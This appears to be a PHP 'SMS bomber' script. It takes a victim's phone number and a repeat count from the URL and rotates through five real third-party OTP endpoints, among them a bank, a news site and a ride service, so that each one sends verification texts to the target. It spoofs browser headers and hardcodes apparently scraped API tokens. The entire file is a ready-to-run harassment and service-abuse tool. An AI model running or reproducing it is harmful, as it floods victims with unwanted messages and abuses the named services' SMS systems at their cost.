<?php
// Check if 'phone' and 'amount' parameters are provided in the URL
if (isset($_GET['phone']) && isset($_GET['amount'])) {
    $phone = $_GET['phone'];
    $amount = (int)$_GET['amount']; // Ensure the amount is an integer

    if ($amount <= 0) {
        echo "Error: 'amount' parameter must be greater than 0.";
        exit;
    }

    // Counter to track total API calls
    $totalCalls = 0;

    // List of APIs to call in order
    $apiList = ['API 1', 'API 2', 'API 3', 'API 4', 'API 5'];

    // Loop to call APIs based on the 'amount'
    for ($i = 0; $i < $amount; $i++) {
        $apiToCall = $apiList[$i % count($apiList)]; // Rotate through APIs
        echo "API Call #" . ($i + 1) . " - $apiToCall:<br>";

        if ($apiToCall === "API 1") {
            // Call API 1
            $api1Url = "https://cihno.aibl.com.bd/cihno-service/api/v1/public/user/send/otp";
            $api1Data = [
                "countryId" => "19",
                "mobileNumber" => $phone,
                "purpose" => "registration"
            ];

            $api1Response = callApi($api1Url, 'POST', $api1Data, [
                "Content-Type: application/json",
                "authorization: Otp bnVsbA=="
            ]);

            if (!$api1Response || (isset($api1Response['otpsent']) && $api1Response['otpsent'] === 'false')) {
                echo "Error: API 1 failed. Message: " . ($api1Response['error'] ?? 'Unknown error') . "<br>";
                continue;
            }

            echo "API 1 Response: " . json_encode($api1Response) . "<br>";
        } elseif ($apiToCall === "API 2") {
            // Call API 2
            $api2Url = "https://chinaonlineapi.com/api/v1/get/otp?phone=" . urlencode($phone);
            $api2Response = callApi($api2Url, 'GET', null, [
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                "token: gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219",
                "Origin: https://chinaonlinebd.com",
                "Referer: https://chinaonlinebd.com/"
            ]);

            if (!$api2Response || (isset($api2Response['status']) && $api2Response['status'] === 'Failed')) {
                echo "Error: API 2 failed. Message: " . ($api2Response['msg'] ?? 'Unknown error') . "<br>";
                continue;
            }

            echo "API 2 Response: " . json_encode($api2Response) . "<br>";
        } elseif ($apiToCall === "API 3") {
            // Call API 3
            $api3Url = "https://prod-api.viewlift.com/identity/otp/resend?site=prothomalo";
            $api3Data = [
                "phoneNumber" => "+88" . $phone
            ];

            $api3Response = callApi($api3Url, 'POST', $api3Data, [
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/108.0",
                "Content-Type: application/json"
            ]);

            if (!$api3Response || (isset($api3Response['status']) && $api3Response['status'] === 'Failed')) {
                echo "Error: API 3 failed. Message: " . ($api3Response['message'] ?? 'Unknown error') . "<br>";
                continue;
            }

            echo "API 3 Response: " . json_encode($api3Response) . "<br>";
        } elseif ($apiToCall === "API 4") {
            // Call API 4
            $api4Url = "https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web";
            $api4Data = [
                "number" => $phone
            ];

            $api4Response = callApi($api4Url, 'POST', $api4Data, [
                "Content-Type: application/json"
            ]);

            if (!$api4Response || (isset($api4Response['status']) && $api4Response['status'] === 'Failed')) {
                echo "Error: API 4 failed. Message: " . ($api4Response['message'] ?? 'Unknown error') . "<br>";
                continue;
            }

            echo "API 4 Response: " . json_encode($api4Response) . "<br>";
        } elseif ($apiToCall === "API 5") {
            // Call API 5
            $api5Url = "https://user-api.jslglobal.co:444/v1/send-otp";
            $api5Data = [
                "phone" => "+88" . $phone,
                "jatri_token" => "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"
            ];

            $api5Response = callApi($api5Url, 'POST', $api5Data, [
                "Content-Type: application/x-www-form-urlencoded",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)",
                "Origin: https://rental.jatri.co",
                "Referer: https://rental.jatri.co/"
            ]);

            if (!$api5Response || (isset($api5Response['status']) && $api5Response['status'] === 'Failed')) {
                echo "Error: API 5 failed. Message: " . ($api5Response['message'] ?? 'Unknown error') . "<br>";
                continue;
            }

            echo "API 5 Response: " . json_encode($api5Response) . "<br>";
        }

        // Increment the total calls counter
        $totalCalls++;
    }

    echo "<br>Total API Calls Made: $totalCalls";
} else {
    echo "Error: 'phone' and 'amount' parameters are required in the URL.";
}

// Function to call an API
function callApi($url, $method, $data = null, $headers = []) {
    $ch = curl_init();

    // Set cURL options
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);

    if ($method === 'POST' && $data) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($data) ? http_build_query($data) : json_encode($data));
    }

    if (!empty($headers)) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }

    // Execute cURL request
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    curl_close($ch);

    // Parse response
    if ($httpCode == 200) {
        return json_decode($response, true);
    } else {
        return null;
    }
}
?>
